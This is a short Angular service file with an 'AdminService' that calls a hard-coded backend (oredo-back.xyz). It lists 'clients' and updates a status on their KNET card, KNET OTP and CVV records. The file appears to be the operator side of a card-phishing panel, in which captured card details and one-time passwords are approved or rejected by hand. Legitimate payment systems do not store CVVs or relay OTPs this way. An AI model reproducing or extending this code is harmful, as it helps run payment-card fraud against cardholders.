import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class AdminService {
  private apiUrl = 'https://oredo-back.xyz';

  constructor(private http: HttpClient) {}

  getAllClients(): Observable<any[]> {
    return this.http.get<any[]>(`${this.apiUrl}/client`);
  }

  updateKnetStatus(id: string, status: string): Observable<any> {
    return this.http.patch(`${this.apiUrl}/knet/${id}`, { status });
  }

  updateOtpStatus(id: string, status: string): Observable<any> {
    return this.http.patch(`${this.apiUrl}/knet-otp/${id}`, { status });
  }

  updateCvvStatus(id: string, status: string): Observable<any> {
    return this.http.patch(`${this.apiUrl}/cvv/${id}`, { status });
  }
}
